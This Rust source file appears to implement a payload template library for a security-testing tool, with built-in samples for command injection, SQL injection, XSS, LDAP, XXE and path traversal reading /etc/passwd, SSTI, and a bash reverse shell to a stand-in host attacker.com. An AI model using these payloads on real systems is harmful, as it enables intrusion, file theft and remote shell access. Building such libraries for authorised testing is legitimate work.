use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use std::collections::HashMap;
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadTemplate {
    pub id: String,
    pub name: String,
    pub category: TemplateCategory,
    pub description: String,
    pub payload: String,
    pub encoding: EncodingType,
    pub tags: Vec<String>,
    pub author: String,
    pub version: String,
    pub created_at: DateTime<Utc>,
    pub usage_count: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum TemplateCategory {
    CommandInjection,
    SqlInjection,
    XssPayload,
    LdapInjection,
    XmlInjection,
    PathTraversal,
    RcePayload,
    TemplateInjection,
    Custom,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EncodingType {
    None,
    Base64,
    UrlEncoded,
    HtmlEntity,
    Hex,
    Custom(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadTemplateLibrary {
    templates: HashMap<String, PayloadTemplate>,
    categories: HashMap<TemplateCategory, Vec<String>>,
}

impl PayloadTemplate {
    pub fn new(
        name: String,
        category: TemplateCategory,
        payload: String,
    ) -> Self {
        Self {
            id: Uuid::new_v4().to_string(),
            name,
            category,
            description: String::new(),
            payload,
            encoding: EncodingType::None,
            tags: Vec::new(),
            author: "system".to_string(),
            version: "1.0.0".to_string(),
            created_at: Utc::now(),
            usage_count: 0,
        }
    }

    pub fn with_description(mut self, desc: String) -> Self {
        self.description = desc;
        self
    }

    pub fn with_encoding(mut self, encoding: EncodingType) -> Self {
        self.encoding = encoding;
        self
    }

    pub fn with_tags(mut self, tags: Vec<String>) -> Self {
        self.tags = tags;
        self
    }
}

impl PayloadTemplateLibrary {
    pub fn new() -> Self {
        let mut library = Self {
            templates: HashMap::new(),
            categories: HashMap::new(),
        };

        // Initialize categories
        library.categories.insert(TemplateCategory::CommandInjection, Vec::new());
        library.categories.insert(TemplateCategory::SqlInjection, Vec::new());
        library.categories.insert(TemplateCategory::XssPayload, Vec::new());
        library.categories.insert(TemplateCategory::LdapInjection, Vec::new());
        library.categories.insert(TemplateCategory::XmlInjection, Vec::new());
        library.categories.insert(TemplateCategory::PathTraversal, Vec::new());
        library.categories.insert(TemplateCategory::RcePayload, Vec::new());
        library.categories.insert(TemplateCategory::TemplateInjection, Vec::new());
        library.categories.insert(TemplateCategory::Custom, Vec::new());

        library.load_builtin_templates();
        library
    }

    fn load_builtin_templates(&mut self) {
        // Command Injection
        let cmd_template = PayloadTemplate::new(
            "Basic Command Injection".to_string(),
            TemplateCategory::CommandInjection,
            "; whoami".to_string(),
        )
        .with_description("Basic Unix command injection for whoami".to_string())
        .with_tags(vec!["unix".to_string(), "basic".to_string()]);
        self.add_template(cmd_template);

        // SQL Injection
        let sql_template = PayloadTemplate::new(
            "SQL Injection - OR".to_string(),
            TemplateCategory::SqlInjection,
            "' OR '1'='1".to_string(),
        )
        .with_description("Classic SQL injection using OR clause".to_string())
        .with_tags(vec!["basic".to_string(), "sqli".to_string()]);
        self.add_template(sql_template);

        // XSS
        let xss_template = PayloadTemplate::new(
            "XSS - Script Tag".to_string(),
            TemplateCategory::XssPayload,
            "<script>alert('XSS')</script>".to_string(),
        )
        .with_description("Basic XSS payload using script tag".to_string())
        .with_tags(vec!["basic".to_string(), "xss".to_string()]);
        self.add_template(xss_template);

        // LDAP Injection
        let ldap_template = PayloadTemplate::new(
            "LDAP Injection - Wildcard".to_string(),
            TemplateCategory::LdapInjection,
            "*".to_string(),
        )
        .with_description("Wildcard LDAP injection for enumeration".to_string())
        .with_tags(vec!["ldap".to_string(), "enumeration".to_string()]);
        self.add_template(ldap_template);

        // XXE
        let xxe_template = PayloadTemplate::new(
            "XXE - File Read".to_string(),
            TemplateCategory::XmlInjection,
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>".to_string(),
        )
        .with_description("XXE payload for reading local files".to_string())
        .with_tags(vec!["xxe".to_string(), "file_read".to_string()]);
        self.add_template(xxe_template);

        // Path Traversal
        let path_template = PayloadTemplate::new(
            "Path Traversal - Unix".to_string(),
            TemplateCategory::PathTraversal,
            "../../../../etc/passwd".to_string(),
        )
        .with_description("Basic Unix path traversal payload".to_string())
        .with_tags(vec!["path_traversal".to_string(), "unix".to_string()]);
        self.add_template(path_template);

        // RCE
        let rce_template = PayloadTemplate::new(
            "RCE - Reverse Shell".to_string(),
            TemplateCategory::RcePayload,
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1".to_string(),
        )
        .with_description("Reverse bash shell for RCE".to_string())
        .with_tags(vec!["rce".to_string(), "reverse_shell".to_string()]);
        self.add_template(rce_template);

        // Template Injection
        let tpl_template = PayloadTemplate::new(
            "SSTI - Jinja".to_string(),
            TemplateCategory::TemplateInjection,
            "{{7*7}}".to_string(),
        )
        .with_description("Server-side template injection for Jinja".to_string())
        .with_tags(vec!["ssti".to_string(), "jinja".to_string()]);
        self.add_template(tpl_template);
    }

    pub fn add_template(&mut self, template: PayloadTemplate) {
        let category = template.category.clone();
        self.templates.insert(template.id.clone(), template.clone());
        self.categories.entry(category).or_insert_with(Vec::new).push(template.id);
    }

    pub fn get_template(&self, id: &str) -> Option<&PayloadTemplate> {
        self.templates.get(id)
    }

    pub fn get_by_category(&self, category: &TemplateCategory) -> Vec<&PayloadTemplate> {
        self.categories
            .get(category)
            .unwrap_or(&Vec::new())
            .iter()
            .filter_map(|id| self.templates.get(id))
            .collect()
    }

    pub fn search(&self, query: &str) -> Vec<&PayloadTemplate> {
        self.templates
            .values()
            .filter(|t| {
                t.name.to_lowercase().contains(&query.to_lowercase())
                    || t.description.to_lowercase().contains(&query.to_lowercase())
                    || t.tags.iter().any(|tag| tag.to_lowercase().contains(&query.to_lowercase()))
            })
            .collect()
    }

    pub fn list_all(&self) -> Vec<&PayloadTemplate> {
        self.templates.values().collect()
    }

    pub fn record_usage(&mut self, id: &str) {
        if let Some(template) = self.templates.get_mut(id) {
            template.usage_count += 1;
        }
    }
}

impl Default for PayloadTemplateLibrary {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_template_creation() {
        let template = PayloadTemplate::new(
            "Test".to_string(),
            TemplateCategory::CommandInjection,
            "payload".to_string(),
        );
        assert_eq!(template.name, "Test");
    }

    #[test]
    fn test_library_creation() {
        let library = PayloadTemplateLibrary::new();
        assert!(!library.list_all().is_empty());
    }

    #[test]
    fn test_search_templates() {
        let library = PayloadTemplateLibrary::new();
        let results = library.search("sql");
        assert!(!results.is_empty());
    }
}
